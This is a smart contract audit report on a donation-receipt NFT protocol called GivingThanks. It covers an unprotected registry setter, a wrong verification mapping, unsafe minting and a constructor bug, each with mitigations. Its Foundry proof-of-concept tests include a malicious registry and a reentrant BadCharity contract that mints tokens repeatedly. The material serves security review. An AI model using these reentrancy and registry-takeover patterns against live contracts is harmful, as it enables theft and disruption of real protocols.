# Giving Thanks Report

# High

# [H-1] Denial of Service and Reentrancy after `GivingThanks:updateRegistry`

**Description:** `GivingThanks:updateRegistry` allows any attacker to take control over the `Registry` , so in combination with `GivingThanks:donate`, the attacker will deny, charge with higher gas for legit `Charities` or bypass `Bad Charities` through `isVerified`. Therefore, allowing `Malicious Contracts` to reenter `donations` again and again.

```javascript
@>   function updateRegistry(address _registry) public {
        //public nor even protected
        registry = CharityRegistry(_registry);
    }
```

**Impact:** legit `Charities` might be denied and reentrancies are allowed to exploit minting mechanism or alter `tokenCounter` order.

**Proof of concept:**

1. **Scenario 1: DOS**
   1. **attacker**: creates a `Malicious Register`.
   2. **attacker**: updates `GivingThanks:Registry`,
   3. **donor**: calls `donate`.
   4. **Malicious Register**: charge with higher gas or deny `isVerified` condition.
   5. **Charity**: receives donation or not.

```javascript
    contract RegistryDOS {
        function isVerified(address) public pure returns (bool) {
            //DOS or high-gas computation
            return false;
        }
    }

    function testRegistryUpdateDOS() public {
        RegistryDOS badRegistry = new RegistryDOS();
        charityContract.updateRegistry(address(badRegistry));
        vm.deal(donor, 10 ether);
        vm.prank(donor);
        vm.expectRevert(bytes("Charity not verified"));
        charityContract.donate{ value: 1 ether }(charity);
    }

```

2. **Scenario 2: Reentrancy and Minting**
   1. **attacker**: creates a `Malicious Register` and `Maliciuos Charity`.
   2. **attacker**: updates `GivingThanks:Registry` ,
   3. **attacker**: calls `donate` to `Maliciuos Charity`.
   4. **Malicious Register**: bypassess `isVerified` condition.
   5. **Maliciuos Charity**: receives donation then reenters `donate` to himself, mining `n` tokens desired.

```javascript
    contract BadCharity {
        uint256 times;
        GivingThanks protocol;

        constructor(address _protocol) {
            protocol = GivingThanks(_protocol);
        }

        fallback() external payable {
            //desired times
            if (times < 10) {
                times = times + 1;
                //will donate himself 0 but minting N times
                protocol.donate{ value: 0 }(address(this));
            }
        }
    }

    function testRegistryUpdateReentrancy() public {
        BadCharity badCharity = new BadCharity(address(charityContract));

        RegistryBypasser badRegistry = new RegistryBypasser();
        charityContract.updateRegistry(address(badRegistry));
        //donor or attacker the bad charity will mint N tokens anyways
        //also alters tokenCounter order
        vm.deal(donor, 1 ether);
        vm.prank(donor);
        charityContract.donate{ value: 0 }(address(badCharity));
    }
```

</details>

**Recommended Mitigation:**

1. Add owner requirement to proceed `Registry` update.
2. protect `donate` with NonReentrant modifier.
3. cache tokenCounter before transfer.

```diff
-    function donate(address charity) public payable {
+    function donate(address charity) public payable nonReentrant {
        require(registry.isVerified(charity), "Charity not verified");
        //@e to malicious charities will afect them not the protocol
+       uint256 tokenId = tokenCounter;
        tokenCounter += 1;
        (bool sent,) = charity.call{ value: msg.value }("");
        require(sent, "Failed to send Ether");
        //@audit unsafe token mint, ERC721Receiver
-        _mint(msg.sender, tokenCounter);
+        _mint(msg.sender, tokenId);

        // Create metadata for the tokenURI
        string memory uri = _createTokenURI(msg.sender, block.timestamp, msg.value);
-        _setTokenURI(tokenCounter, uri);
+        _setTokenURI(tokenId, uri);

-       tokenCounter += 1;
    }


   function updateRegistry(address _registry) public {
+      require(msg.sender == owner);
       registry = CharityRegistry(_registry);
   }
```

# Medium

# [M-1] wrong verification at `CharityRegistry:isVerified` function

**Description:** `CharityRegistry:isVerified` function uses `registeredCharities` instead of `verifiedCharities` to properly determine `Charities` verification.

`registeredCharities` is intented for registering only.

```javascript
    function isVerified(address charity) public view returns (bool) {
        //
      @> return registeredCharities[charity];
    }
```

**Impact:** Any registered `Charity` is able to receive donations at `GivingThanks:donate`.

**Proof of Concept:**

1. **Donor:** calls donate to an any charity.
2. **Charity:** at least registered bypasses `CharityRegistry:isVerified` check.
3. **Charity:** receives donation amount.
4. **Donor:** receives the Donation Receipt NFT.

```javascript
    function testRegisteredCharitiesReceiveDonations() public {
        address anyCharity = makeAddr("anyCharity");
        //only register
        registryContract.registerCharity(anyCharity);
        vm.deal(donor, 10 ether);
        vm.prank(donor);
        charityContract.donate{ value: 1 ether }(anyCharity);

        assertEq(anyCharity.balance, 1 ether);
    }
```

**Recommended Mitigation:**

- use `verifiedCharities` as it should.

```diff
    function isVerified(address charity) public view returns (bool) {
-       return registeredCharities[charity];
+       return verifiedCharities[charity];
    }
```

# [M-2] Unsafe NFT Minting with `_mint` for donors who not support ERC721Receiver

**Description:** within the `GivingThanks:donate`, the function `_mint` is called which transfers tokens to recipients wether they support ERC721Receiver, that if donor do not handle these tokens, they will be get stuck.

```javascript
   function donate(address charity) public payable {
        require(registry.isVerified(charity), "Charity not verified");
        (bool sent,) = charity.call{ value: msg.value }("");
        require(sent, "Failed to send Ether");
    @>  _mint(msg.sender, tokenCounter);
        string memory uri = _createTokenURI(msg.sender, block.timestamp, msg.value);
        _setTokenURI(tokenCounter, uri);

        tokenCounter += 1;
    }
```

**Impact:** Permanent loss of tokens with the donors if they do not implement ERC721Receiver

**Proof of Concept:**

**Recommended Mitigation:**

- use `_safeMint` instead for contract donors.

# Low

# [L-1] `_registry` should be set instead of msg.sender at construction

**Description:** during construction the `CharityRegistry` is being set as `msg.sender` instead of `_registry` param.

```javascript
    constructor(address _registry) ERC721("DonationReceipt", "DRC") {
    @>  registry = CharityRegistry(msg.sender);
        owner = msg.sender;
        tokenCounter = 0;
    }
```

**Impact:** Donation cannot proceed unless `CharityRegistry` gets updated

**Proof of Concept:**

CharityRegistry wronly instantiated at construction. Hence, Donations cannot proceed.

- **Owner - Deployer:** deploy the protocol (`_registry` param unused)

```javascript
   function testImpededDonations() public {
        // run setUp which deploys as follows
        // new GivingThanks(address(registryContract));
        vm.deal(donor, 10 ether);
        vm.expectRevert();
        vm.prank(donor);
        charityContract.donate{ value: 1 ether }(charity);
    }
```
